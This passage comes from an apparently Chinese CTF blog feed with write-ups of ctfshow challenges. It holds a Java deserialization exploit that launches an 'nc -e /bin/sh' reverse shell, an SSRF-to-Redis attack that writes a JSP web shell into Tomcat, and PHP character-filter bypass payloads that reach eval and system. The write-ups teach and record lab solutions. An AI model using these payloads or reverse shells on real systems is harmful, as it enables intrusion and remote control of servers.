aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="11-web843"><a href="#11-web843" class="headerlink" title="11. web843"></a>11. web843</h2><ul><li>题目描述</li></ul><blockquote><p>点击下方按钮审计源码            </p></blockquote><ul><li>题目解析</li></ul><p>下载下来源码进行审计</p><p>在 CookieFilter 中发现反序列化入口</p><p><img src="/../../../pic/image-20230124183140802.png"></p><p>在 Config 中找到利用点</p><p><img src="/../../../pic/image-20230124183204738.png"></p><p>编写 Exp</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>ctfshow</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>ctfshow<span class="token punctuation">.</span>entity<span class="token punctuation">.</span></span><span class="token class-name">Config</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Config</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        config<span class="token punctuation">.</span><span class="token function">setArgs</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">"nc"</span><span class="token punctuation">,</span> <span class="token string">"IP"</span><span class="token punctuation">,</span> <span class="token string">"PORT"</span><span class="token punctuation">,</span> <span class="token string">"-e"</span><span class="token punctuation">,</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> byteArrayOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ObjectOutputStream</span> objectOutputStream <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>config<span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        objectOutputStream<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> payload <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>byteArrayOutputStream<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作为 Cookie 提交</p><pre class="line-numbers language-none"><code class="language-none">[COOKIE]token=payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/image-20230124183338428.png"></p><h2 id="12-web844"><a href="#12-web844" class="headerlink" title="12. web844"></a>12. web844</h2><ul><li>题目描述</li></ul><p>点击下方按钮审计源码            </p><ul><li>题目解析</li></ul><p>还是审计源码</p><p>在 IndexController 下存在 SSRF 点</p><p><img src="/../../../pic/image-20230124184707207.png"></p><p>测试一下功能</p><pre class="line-numbers language-none"><code class="language-none">[GET]goPage?url=127.0.0.1&amp;port=80<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/image-20230124184903542.png"></p><p>能够成功利用，进而扫描一下那些端口开放，当扫描到6379 时很久都没有响应</p><p><img src="/../../../pic/image-20230124185249559.png"></p><p>推测该端口开放 Redis 服务，利用 SSRF 打 Redis</p><p>查看下配置信息，不需要认证</p><pre class="line-numbers language-none"><code class="language-none">[GET]/goPage?info&amp;quit&amp;url=127.0.0.1&amp;port=6379<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>直接写马</p><pre class="line-numbers language-none"><code class="language-none">[GET]/goPage?config set dir /usr/local/tomcat/webapps/ROOT/&amp;config set dbfilename shell.jsp&amp;set shell '%3C%25Runtime.getRuntime%28%29.exec%28new%20String%5B%5D%7B%22sh%22%2C%22-c%22%2Crequest.getParameter%28%22cmd%22%29%7D%29%3B%25%3E'&amp;save&amp;quit&amp;url=127.0.0.1&amp;port=6379<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>访问 shell.jsp 获得马，执行反弹shell</p><pre class="line-numbers language-none"><code class="language-none">[GET]/shell.jsp?cmd=nc IP PORT -e /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../../../pic/image-20230124192444150.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ctf-show.feishu.cn/docx/doxcnZL3hhHWN1swsjRPSQrv7xf">CTFshow-Web入门-税务比武wp</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF 秀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF 秀 - RCE 极限挑战</title>
      <link href="/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-rce-ji-xian-tiao-zhan/"/>
      <url>/2023/01/21/catchtheflag/ctf-xiu/ctf-xiu-rce-ji-xian-tiao-zhan/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-秀-RCE-极限挑战"><a href="#CTF-秀-RCE-极限挑战" class="headerlink" title="CTF 秀 - RCE 极限挑战"></a>CTF 秀 - RCE 极限挑战</h1><p>#PHP自增Shell </p><p>该类型题目主要还是考查对 PHP 自增 Shell 的理解</p><h2 id="1-RCE挑战-1"><a href="#1-RCE挑战-1" class="headerlink" title="1. RCE挑战 1"></a>1. RCE挑战 1</h2><p>题目直接给出了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"括号"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"点"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>不能使用所有的函数，但是 <code>echo</code> 不需要括号即可以调用</p><pre class="line-numbers language-none"><code class="language-none">code=echo `tac /f1agaaa`;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-RCE挑战-2"><a href="#2-RCE挑战-2" class="headerlink" title="2. RCE挑战 2"></a>2. RCE挑战 2</h2><p>题目直接给出了源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9@#%^&amp;*:{}\-&lt;\?&gt;\"|`~\\\\]/"</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Are you hacking me AGAIN?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先看一下还留了哪些字符给我们使用</p><p>使用 PHP 遍历一下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9@#%^&amp;*:{}\-&lt;\?&gt;\"|`~\\\\]/"</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除了一些不可见字符以外还有这些可用</p><pre class="line-numbers language-none"><code class="language-none">! $ ' ( ) + , . / ; = [ ] _<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用自增搞出来一个 <code>$_GET[_]($_GET[__]);</code></p><pre class="line-numbers language-none"><code class="language-none">$_=[].[];  // ArrayArray$_=$_['']; // A$_++;  // B$_++;  // C$_++;  // D$_++;  // E$__=$_;  // E$_++;  // F$_++;  // G$__=$_.$__;  // GE$_++;  // H$_++;  // I$_++;  // J$_++;  // K$_++;  // L$_++;  // M$_++;  // N$_++;  // O$_++;  // P$_++;  // Q$_++;  // R$_++;  // S$_++;  // T$__.=$_;  // GET<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后使用的 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221122155342.png"></p><h2 id="3-RCE挑战-3"><a href="#3-RCE挑战-3" class="headerlink" title="3. RCE挑战 3"></a>3. RCE挑战 3</h2><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">105</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z2-9!'@#%^&amp;*:{}\-&lt;\?&gt;\"|`~\\\\]/"</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Are you hacking me AGAIN?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先检查还有哪些可以用的</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z2-9!'@#%^&amp;*:{}\-&lt;\?&gt;\"|`~\\\\]/"</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// $ ( ) + , . / 0 1 ; = [ ] _</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>多出来两个数字可以使用，可以直接取 A，同时我们已知 0/0 会获取到 NAN，可以直接取到 N，方便构造 POST，也会减少代码量</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// N</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span> <span class="token comment">// O</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span> <span class="token comment">// _PO</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token comment">// Q</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// _POS</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span>  <span class="token comment">// _POST</span><span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// $_POST[_]($_POST[__])</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后使用的 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$_</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token operator">++</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token constant">_</span><span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token operator">.</span><span class="token variable">$__</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">.=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctf_show<span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">/</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token constant">_</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$__</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$__</span><span class="token operator">%</span><span class="token number">3</span>d_<span class="token operator">.</span><span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">.</span><span class="token variable">$__</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$__</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$__</span><span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token variable">$_</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$$__</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">&amp;</span><span class="token constant">_</span><span class="token operator">=</span>system<span class="token operator">&amp;</span><span class="token constant">__</span><span class="token operator">=</span>id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../pic/Pasted%20image%2020221122162240.png"></p><h2 id="4-RCE挑战-4"><a href="#4-RCE挑战-4" class="headerlink" title="4. RCE挑战 4"></a>4. RCE挑战 4</h2><p>题目直接给出源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">//本题灵感来自研究Y4tacker佬在吃瓜杯投稿的shellme时想到的姿势，太棒啦~。</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf_show'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">84</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z1-9!'@#%^&amp;*:{}\-&lt;\?&gt;\"|`~\\\\]/"</span><span class="token punctuation">,</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$ctfshow</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Are you hacking me AGAIN?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">phpinfo</span><span 